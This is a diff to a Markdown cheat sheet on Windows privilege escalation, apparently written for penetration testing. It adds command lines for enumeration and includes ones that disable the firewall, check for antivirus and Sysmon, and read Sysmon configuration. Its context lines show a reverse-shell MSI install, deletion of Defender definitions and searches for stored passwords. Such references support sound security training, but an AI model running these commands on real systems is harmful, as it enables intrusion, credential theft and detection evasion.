@@ -2,7 +2,7 @@
 ## Contents 
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   * [Contents](#contents)
-  * [Command line](#command-line)
+  * [Command s](#commands)
   * [Powershell](#powershell)
     + [Windows Kernel Versions](#windows-kernel-versions)
     + [Important Files](#important-files)
@@ -60,7 +60,7 @@
   * [Cheat Sheets and Guides](#cheat-sheets-and-guides)
   * [Learn More](#learn-more)
 
-## Command line
+## Commands
     systeminfo 
     whoami /priv      
     ipconfig /all  
@@ -69,16 +69,27 @@
     qwinsta                          #is anyone else logged in?   
     net localgroup    
     dir /r    
-    tree /a /f    
+    tree /a /f                        #dir walk 
     set                               #enviromental variables
     net use                           #connected drives  
     net share                         #shared folders
-    tasklist /v /fi "username eq system"      #tasks running as SYSTEM  
-    
     netstat -ano    
+    tasklist /v /fi "username eq system"      #tasks running as SYSTEM  
+    wmic product get name,version       #installed apps and versions 
+Services 
+
+    net start                         #running services 
+    PS > wmic service where "name like 'service'" get Name,PathName        #more info on a service 
+    PS > Get-Process -Name service  
+
+    
+ Firewalls    
+ 
     netsh firewall show state 
     netsh firewall show config   
-    
+    PS > Get-NetFirewallProfile | Format-Table Name, Enabled  
+    PS > Get-NetFirewallRule | select DisplayName, Enabled, Description #firewall rules 
+    PS > Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False       #disable firewall (if admin)   
 ## Powershell
     powershell.exe -nop -ep bypass    
     Get-ExecutionPolicy    
@@ -248,6 +259,9 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
     #upload reverse reverse shell to C:\temp  
     msiexec /quiet /qn /i C:\Temp\reverse.msi
 ## Passwords  
+Hidden Files  
+
+    PS > Get-ChildItem -Hidden -Path C:\Users\admin\Desktop\     
 Run from C:\ (recursive search). C:\Windows\Panther\Unattend.xml: base64 password    
 
     findstr /si password *.xml *.ini *.txt *.config 2>nul    
@@ -473,8 +487,23 @@ Add this reg key:
 
  ## AV Evasion  
  ### Check for AV  
-     sc query windefend
+ 
+ Check on Workstations
+     wmic /namespace:\\root\securitycenter2 path antivirusproduct   
+     PS > Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct   
+ Check for Windows Defender Service 
+ 
+     sc query windefend 
+     PS > Get-MpComputerStatus | select RealTimeProtectionEnabled   #check for status for elements like Anti-Spyware, Antivirus, etc.   
      "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All               #Delete all rules of Defender (useful for machines without internet access)   
+     PS > Get-MpThreat    #threats ID'd by Defender  
+ SysMon 
+ 
+     PS > Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }  
+     PS > Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"  
+     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational   
+     findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*      #if sysmon is installed, try to read config file    
+
  ### Obfuscate Payloads
 Use wrapper files to call static executables (such as nc) 
 [Chameleon](https://github.com/klezVirus/chameleon): Powershell script obfuscator  
